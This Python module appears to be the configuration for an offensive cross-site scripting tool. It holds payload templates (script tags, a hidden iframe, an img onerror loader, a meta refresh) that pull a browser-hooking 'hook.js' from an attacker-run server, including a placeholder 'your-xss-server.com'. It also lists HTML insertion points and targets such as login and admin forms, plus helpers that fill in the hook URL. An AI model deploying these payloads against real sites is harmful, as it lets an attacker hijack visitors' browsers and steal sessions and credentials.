XSS_ADVANCED_CONFIG = {
    "default_hook_url": "http://localhost:3000/hook.js",
    "alternative_hooks": [
        "http://192.168.1.100:3000/hook.js",
        "http://xss.local:3000/hook.js",
        "https://your-xss-server.com/hook.js"
    ],
    "payloads": {
        "hook": '<script src="{hook_url}"></script>',
        "alert": '<script>alert("XSS Test");</script>',
        "console": '<script>console.log("Injection successful");</script>',
        "iframe": '<iframe src="{hook_url}" style="display:none;"></iframe>',
        "img": '<img src="x" onerror="document.createElement(\'script\').src=\'{hook_url}\'">',
        "link": '<link rel="stylesheet" href="{hook_url}">',
        "meta": '<meta http-equiv="refresh" content="0;url={hook_url}">'
    },
    "injection_points": [
        "</head>",
        "</body>",
        "<head>",
        "<body>"
    ],
    "detection_patterns": [
        r'hook\.js',
        r'localhost:3000',
        r'advanced_hook',
        r'xss\.local'
    ],
    "form_targets": [
        "login",
        "admin",
        "user",
        "register",
        "contact",
        "search"
    ]
}

def get_xss_advanced_hook_url(custom_url=None):
    if custom_url:
        return custom_url
    return XSS_ADVANCED_CONFIG["default_hook_url"]

def get_xss_advanced_payload(payload_type, hook_url):
    payload_template = XSS_ADVANCED_CONFIG["payloads"].get(payload_type, XSS_ADVANCED_CONFIG["payloads"]["hook"])
    return payload_template.format(hook_url=hook_url)

def get_xss_advanced_injection_points():
    return XSS_ADVANCED_CONFIG["injection_points"]

def get_xss_advanced_detection_patterns():
    return XSS_ADVANCED_CONFIG["detection_patterns"] 